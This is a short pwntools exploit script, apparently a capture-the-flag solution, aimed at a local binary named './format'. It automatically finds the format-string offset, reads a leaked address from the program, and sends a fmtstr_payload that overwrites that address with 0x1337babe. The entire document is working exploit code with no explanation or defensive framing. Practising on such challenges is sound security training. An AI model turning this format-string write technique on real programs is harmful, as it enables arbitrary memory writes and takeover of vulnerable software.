from pwn import *

program = "./format"
def exec_fmt(payload):
     p = process(program)
     p.recvline()
     p.sendline(payload)
     p.sendline(b'a')
     return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
p = process(program, stderr=PIPE)
addr = unpack(p.recv(4))
payload = fmtstr_payload(offset, {addr: 0x1337babe})
p.sendline(payload)
print(hex(unpack(p.recv(4))))
